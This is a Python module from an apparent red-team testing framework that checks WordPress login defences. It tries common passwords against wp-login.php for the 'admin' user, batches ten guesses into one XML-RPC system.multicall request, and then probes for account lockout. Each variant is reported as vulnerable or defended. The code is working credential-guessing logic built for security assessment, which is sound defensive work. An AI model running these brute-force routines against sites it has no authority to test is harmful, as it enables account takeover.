"""WordPress authentication brute force attack vectors.

Tests login rate limiting, account lockout, and XML-RPC multicall
amplification attacks against WordPress authentication.
"""

import time

from redteam.base import Attack, AttackResult, Severity, Status


class BruteForceAttack(Attack):
    name = "wordpress.brute_force"
    category = "wordpress"
    severity = Severity.HIGH
    description = "WordPress authentication brute force and lockout bypass"
    target_types = {"wordpress"}

    COMMON_PASSWORDS = ["admin", "password", "123456", "admin123", "wordpress"]
    XMLRPC_PASSWORDS = [
        "letmein", "qwerty", "monkey", "dragon", "master",
        "abc123", "111111", "iloveyou", "trustno1", "sunshine",
    ]

    async def execute(self, client) -> list[AttackResult]:
        if self._is_aws_mode():
            return [self._make_result(
                variant="aws_skip",
                status=Status.SKIPPED,
                details="Brute force tests skipped in AWS mode to avoid account lockout side-effects",
            )]

        results = []
        results.extend(await self._wp_login_brute(client))
        results.extend(await self._xmlrpc_multicall_brute(client))
        results.extend(await self._login_lockout_detection(client))
        return results

    # ------------------------------------------------------------------
    # Variant 1: wp-login.php brute force
    # ------------------------------------------------------------------
    async def _wp_login_brute(self, client) -> list[AttackResult]:
        """POST 5 common passwords to wp-login.php for user 'admin'.

        VULNERABLE if no lockout or rate limiting after all attempts.
        DEFENDED if any request returns 429 or a lockout message.
        """
        results_data = []
        rate_limited = False
        lockout_detected = False
        successful_login = False

        for pw in self.COMMON_PASSWORDS:
            start = time.monotonic()
            try:
                status_code, body, headers = await client.post_form(
                    client.login_path,
                    {"log": "admin", "pwd": pw, "wp-submit": "Log In"},
                    authenticated=False,
                )
                duration = (time.monotonic() - start) * 1000

                results_data.append({
                    "password": pw,
                    "status": status_code,
                    "duration_ms": round(duration, 1),
                })

                if status_code == 302:
                    successful_login = True
                elif status_code == 429:
                    rate_limited = True
                elif "locked" in body.lower() or "too many" in body.lower():
                    lockout_detected = True

            except Exception as e:
                results_data.append({"password": pw, "error": str(e)})

        # Determine result
        if successful_login:
            status = Status.VULNERABLE
            evidence = "Default password accepted for 'admin' account"
        elif rate_limited or lockout_detected:
            status = Status.DEFENDED
            evidence = "Rate limiting or lockout triggered during brute force"
        else:
            status = Status.VULNERABLE
            evidence = f"All {len(self.COMMON_PASSWORDS)} attempts processed without rate limiting"

        return [self._make_result(
            variant="wp_login_brute",
            status=status,
            evidence=evidence,
            details=(
                f"Attempted {len(self.COMMON_PASSWORDS)} passwords against wp-login.php. "
                f"Rate limited: {rate_limited}, Lockout: {lockout_detected}, "
                f"Successful login: {successful_login}"
            ),
            request={"target": "wp-login.php", "user": "admin", "attempts": len(self.COMMON_PASSWORDS)},
            response={"attempts": results_data},
        )]

    # ------------------------------------------------------------------
    # Variant 2: XML-RPC multicall amplification
    # ------------------------------------------------------------------
    async def _xmlrpc_multicall_brute(self, client) -> list[AttackResult]:
        """Batch 10 wp.getUsersBlogs calls via system.multicall.

        A single HTTP request tests 10 passwords simultaneously,
        amplifying brute force efficiency by 10x.
        VULNERABLE if all attempts processed.
        DEFENDED if multicall is blocked or rate limited.
        """
        calls = [
            ("wp.getUsersBlogs", ["admin", pw])
            for pw in self.XMLRPC_PASSWORDS
        ]

        start = time.monotonic()
        try:
            status_code, body, headers = await client.xmlrpc_multicall(calls)
            duration = (time.monotonic() - start) * 1000
        except Exception as e:
            return [self._make_result(
                variant="xmlrpc_multicall_brute",
                status=Status.ERROR,
                evidence=str(e),
                details="Exception during XML-RPC multicall request",
            )]

        # Blocked entirely (403, 405, 501) or XML-RPC disabled
        if status_code in (403, 405, 501):
            return [self._make_result(
                variant="xmlrpc_multicall_brute",
                status=Status.DEFENDED,
                evidence=f"XML-RPC returned {status_code} - endpoint blocked",
                details="XML-RPC multicall is disabled or blocked at the server level",
                request={"method": "system.multicall", "batched_calls": len(calls)},
                response={"status": status_code, "body": body[:300]},
                duration_ms=duration,
            )]

        if status_code == 429:
            return [self._make_result(
                variant="xmlrpc_multicall_brute",
                status=Status.DEFENDED,
                evidence="XML-RPC multicall rate limited (429)",
                details="Rate limiting prevented amplified brute force via multicall",
                request={"method": "system.multicall", "batched_calls": len(calls)},
                response={"status": status_code},
                duration_ms=duration,
            )]

        # Check if the multicall processed all sub-calls
        # A defended system blocks multicall or limits sub-call count
        fault_count = body.lower().count("<fault>")
        response_count = body.lower().count("<value>")
        multicall_blocked = (
            "multicall" in body.lower() and "not allowed" in body.lower()
        )

        if multicall_blocked:
            status = Status.DEFENDED
            evidence = "system.multicall explicitly disabled"
        elif status_code == 200 and response_count >= len(calls):
            status = Status.VULNERABLE
            evidence = (
                f"Multicall processed all {len(calls)} authentication attempts "
                f"in a single HTTP request (10x amplification)"
            )
        else:
            status = Status.PARTIAL
            evidence = (
                f"Multicall returned {status_code} with {response_count} responses "
                f"and {fault_count} faults"
            )

        return [self._make_result(
            variant="xmlrpc_multicall_brute",
            status=status,
            evidence=evidence,
            details=(
                f"Sent {len(calls)} wp.getUsersBlogs calls in one system.multicall request. "
                f"Response count: {response_count}, Faults: {fault_count}"
            ),
            request={"method": "system.multicall", "batched_calls": len(calls)},
            response={"status": status_code, "body": body[:500]},
            duration_ms=duration,
        )]

    # ------------------------------------------------------------------
    # Variant 3: lockout detection after brute force
    # ------------------------------------------------------------------
    async def _login_lockout_detection(self, client) -> list[AttackResult]:
        """After previous brute force attempts, check if account is locked.

        DEFENDED if the account is now locked out.
        VULNERABLE if still accepting login attempts.
        """
        start = time.monotonic()
        try:
            status_code, body, headers = await client.post_form(
                client.login_path,
                {"log": "admin", "pwd": "lockout_check_probe", "wp-submit": "Log In"},
                authenticated=False,
            )
            duration = (time.monotonic() - start) * 1000
        except Exception as e:
            return [self._make_result(
                variant="login_lockout_detection",
                status=Status.ERROR,
                evidence=str(e),
                details="Exception while probing for account lockout",
            )]

        is_locked = (
            status_code == 429
            or "locked" in body.lower()
            or "too many" in body.lower()
            or "blocked" in body.lower()
        )

        return [self._make_result(
            variant="login_lockout_detection",
            status=Status.DEFENDED if is_locked else Status.VULNERABLE,
            evidence=(
                "Account lockout detected after brute force attempts"
                if is_locked
                else f"Account still accepting attempts (status {status_code}) - no lockout policy"
            ),
            details=(
                f"Post-brute-force probe returned {status_code}. "
                f"Lockout indicators in body: {is_locked}"
            ),
            request={"target": "wp-login.php", "user": "admin", "purpose": "lockout probe"},
            response={"status": status_code, "body": body[:300]},
            duration_ms=duration,
        )]
